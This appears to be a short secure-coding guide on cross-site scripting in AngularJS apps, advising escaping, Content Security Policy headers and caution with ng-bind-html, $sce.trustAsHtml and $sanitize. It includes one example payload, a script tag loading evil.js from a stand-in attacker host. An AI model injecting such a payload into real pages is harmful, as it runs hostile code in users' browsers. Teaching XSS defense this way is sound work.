# XSS

## 0. Understand XSS.

Cross-site scripting (XSS) involves someone finding a way to get your user's
browser to run JavaScript code you didn't intend your app to run. The most
common way of doing this is by submitting HTML through one of the forms and
counting on your app to add this HTML to the page. Since injected code is run
by the browser in the context of _your_ application, the opportunities for
abuse are endless.

Suppose we are writing a blog that accepts comments. When we display comments
we do so by setting `div.innerHTML`. Someone posts a comment that says:

```html
  <script src="http//h4kk3rs.com/code/that/does/something/evil.js"></script>
```

Your app will add this HTML to the DOM, which will cause the browser to run
the code.


## 1. Do not assume you can make HTML safe.

HTML is a beast.
[You can't parse it with regular expressions](http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags).
You can't count on knowing all the crazy corners in all versions for all
browsers. So, don't count on running HTML through a regexp and fully sanitizing it.

The only moderately safe way of handling HTML in a browser is
to escape it, though even that will leave you open to XSS on some browsers.


## 2. Set Content Security Policy headers.

Content Security Policy headers tell modern browsers to block some of the most
common holes. Don't count on it to prevent all XSS, but do it for a good
measure.

## 3. Avoid attaching external HTML into DOM.

Since external HTML cannot be made safe, the best strategy is to avoid
inserting it into DOM. Angular gives you some methods of doing this if you
really insist, plus you always attach it to DOM directly. This doesn't make it
a good idea, however.


AngularJS will escape HTML fed through `{{...}}` and `ng-bind`. This is for a
good reason.

If you really insist, however, you _can_ add HTML to a view by using
`ng-bind-html`. Angular will require you to push the content through
`$sce.trustAsHtml()` before you can do this. Note that this does not make it
safe. `trustAsHtml()` is just your way of saying to Angular: "Trust me, I know
what I am doing." The question is: do you?

If you really have to incorporate untrusted HTML, run it through `$sanitize`.
Make sure to keep your fingers crossed.
